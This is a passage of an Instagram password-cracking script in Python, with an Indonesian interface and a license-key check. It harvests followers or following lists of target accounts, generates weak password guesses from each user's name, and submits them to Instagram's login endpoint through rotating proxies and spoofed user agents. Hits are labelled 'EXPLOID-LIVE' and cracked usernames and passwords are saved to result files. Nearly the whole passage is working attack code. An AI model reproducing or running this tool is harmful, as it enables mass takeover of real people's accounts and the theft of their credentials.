                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123', w+'1234', w +
                                             '12345', w+'123456', f'{w}1234567', f'{w}12345678']
                                else:
                                    sandi = [w, password.lower()]
                            elif o == "4":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123', w+'1234',w +
                                             '12345', f'{w}1234567', f'{w}123456', f'{w}321', f'{w}4321', 'qwertyuiop', '1q2w3e4r']
                                else:
                                    sandi = [w, password.lower()]
                            elif o == "5":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI, username, sandi)
                except:
                    print('Error')
                    pass
        print('\n')
        cetak(nel('[white][+] CRACK SELESAI', style='blue'))
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop, success, checkpoint
        bo = random.choice([CY, H, M, K])
        sess = requests.Session()
        sys.stdout.write(
            f"\r{bo}[🐊] [{loop}/{len(internal)}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]"), sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip = random.choice(prox)
                proxs = {'http': 'socks5://'+nip}
                uanya = genUA2()
                if len(ugen) > 1:
                    uanya = random.choice(ugen)
                token = sess.get('https://z-p15.www.instagram.com/accounts/login/?hl=en', headers={'user-agent': uanya}, timeout=5)
                cook = token.cookies.get_dict()
                headers = {
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-asbd-id": "198387",
                    "x-csrftoken": cook['csrftoken'],
                    "x-ig-app-id": "1217981644879628",
                    "x-ig-www-claim": "0",
                    "x-instagram-ajax": "c9e803a8d542",
                    "x-requested-with": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/",
                    "Referrer-Policy": "strict-origin-when-cross-origin",
                    'user-agent': uanya
                }

                param = {
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x = sess.post("https://z-p15.www.instagram.com/accounts/login/ajax/",
                           headers=headers, data=param, proxies=proxs, timeout=5)
                open('stat.log', 'a').write(f'{x.text} [{user} | {pw}] | {uanya}\n')
                x_jason = json.loads(x.text)
                if "userId" in str(x_jason):
                    try:
                        nama, pengikut, mengikut, postingan = self.APIinfo(user)
                        io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nUA: {meua}'
                        oi = nel(io, style='green')
                        print('\n')
                        cetak(nel(oi, title=' EXPLOID-LIVE'))
                        open(
                            f"result/success-{day}.txt", "a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                        success.append(user)
                    except:
                        open(
                            f"result/success-{day}.txt", "a").write(f'{user}|{pw}| Connection Error!\n')
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama, pengikut, mengikut, postingan = self.APIinfo(user)
                    io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nUA: {meua}'
                    print('\n')
                    oi = nel(io, style='yellow')
                    cetak(nel(oi, title=' JNG NGELUH KNTL'))
                    open(
                        f"result/checkpoint-{day}.txt", "a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                elif 'Please wait a few minutes' in str(x_jason):
                    sleep(10)
                    continue
                elif 'ip_block' in str(x_jason):
                    sys.stdout.write(
                        f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}")
                    sys.stdout.flush()
                    sleep(30)
                    if user in success or user in checkpoint:
                        break
                    else:
                        self.crackAPI(user, pas)
                elif 'spam' in str(x_jason):
                    sys.stdout.write(
                        f"\r[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}")
                    sys.stdout.flush()
                    sleep(30)
                    if user in success or user in checkpoint:
                        break
                    else:
                        self.crackAPI(user, pas)
                elif 'Please double-check your password' in str(x_jason):
                    continue
                elif 'message' in x_jason:
                    if x_jason['message'] == '':
                        continue
                else:
                    continue

            loop += 1
        except Exception as e:
            open('error.log', 'a').write('Error : {}\n'.format(e))
            self.crackAPI(user, pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR2Ek9EDcQ9Zua1CoM84zHBDRWn9SLxUEdMXXme9fE-t1A_9',
                'x-instagram-ajax': '1006341524',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': user_agent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://z-p15.www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green')
                print('\n')
                cetak(nel(oi, title=' LIVE'))

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'  [+] Pilih :{C}  ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            cetak(nel('[white][+] masukkan jumlah target crack', style='blue'))
            m=int(input(f'  [{K}+{C}] Jumlah : {H}'))
            cetak(nel('[white][+] Masukan nama random', style='blue'))
            for i in range(m):
                i+1
                nama=input(f'  [{K}+{C}] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            cetak (nel('[white][+] PASTIKAN TARGET BERSIFAT PUBLIK', style='blue'))
            mas=input(f'  [{K}+{C}] Apakah anda ingin crack masal? y/t :  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG')


        elif c in ('3','03'):
            cetak(nel('[white][+]PASTIKAN TARGET BERSIFAT PUBLIK', style='blue'))
            mas=input(f'  [{K}+{C}] Apakah anda ingin crack masal? y/t :  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG ')
           
        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}EXPLOID-CP{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} EXPLOID  : LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
                    """);sleep(0.05)    
        elif c in ('d','D'):
            self.BUG()
        elif c in ('0','00'):
            self.Exit()

        else:
            self.menu()
def tlisensi():
    banner()
    wel='# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    lisen=input('[•] Enter License : ')
    open('.lisen.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMDQ5MjE1NiIsImxRSVg5TFdaS2Z1UXFybUR1THZUMFByUHZjZEFhWmxMTzJNNWhucTIiXQ==&ProductId=15613&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LICENSE APPLICABLE '
        wel2 = mark(wel, style='magenta')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
        login_kamu()
    else:
        tlisensi()

def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
                m=int(input(f'  [{H}+{C}] Masukan jumlah target: {N}'))
            except:
                m=1
            for t in range(m):
                t +=1
                cetak(nel(f'[white][+] TOTAL ID :{len(internal)}', style='blue'))
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id,mode='following')
            self.passwordAPI(info)

def meng(self):
    menudump.append('pengikut')
    cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
    m=input(f'  [{K}+{C}] Username target : {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id,mode='following')
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
                m=int(input(f'  [{K}+{C}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                cetak(nel(f'[white][+] TOTAL ID :{len(internal)}', style='blue'))
                nama=input(f' [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id,mode='followers')
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            cetak(nel('[white][+]Target harus bersifat publik jangan privat', style='blue'))
            m=input(f'  [{K}+{C}] Username target : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id,mode='followers')
            self.passwordAPI(info)

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}x{C}] Koneksi internet bermasalah')


#ISAL X CODEE
#ECAA CANTIK
